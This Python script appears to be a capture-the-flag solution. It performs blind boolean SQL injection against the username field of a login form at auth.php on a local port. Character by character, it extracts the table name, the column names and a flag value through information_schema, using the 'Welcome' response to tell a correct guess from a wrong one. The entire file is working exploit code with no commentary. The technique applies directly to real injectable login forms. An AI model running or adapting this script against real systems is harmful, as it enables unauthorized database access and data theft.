import requests as req
import string

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",}{_.:!@$^&*()#"
#url = "http://localhost/auth.php"
url = "http://0.0.0.0:3737/auth.php"
check = "Welcome"

def get_table():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nTable name =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "' OR (SELECT BINARY SUBSTR(GROUP_CONCAT(table_name), {}, 1) FROM information_schema.tables WHERE table_schema=database()) = '{}' #".format(index, char)
				
				r = req.post(url, data={'username': payload, 'password': 'test'})

				if check in r.text:
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

def get_collumn():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nColumn name =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "' OR (SELECT BINARY SUBSTR(GROUP_CONCAT(column_name), {}, 1) FROM information_schema.columns WHERE table_name='the_flags') = '{}' #".format(index, char)

				r = req.post(url, data={'username': payload, 'password': 'test'})

				if check in r.text:
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

def get_flag():
	temp = ""
	index = 1
	loop = 0

	while True:
		if loop == 1:
			print("\nFlag =>" + temp +"\n")
			return temp

		if loop == 0:
			for char in domain:
				payload= "' OR (SELECT BINARY SUBSTR(NAME_of_THE_flagz, {}, 1) FROM the_flags) = '{}' #".format(index, char)

				r = req.post(url, data={'username': payload, 'password': 'test'})

				if check in r.text:
					temp += char
					index += 1
					print(temp)
					break

				elif char == "#":
					loop = 1

get_table()
get_collumn()
get_flag()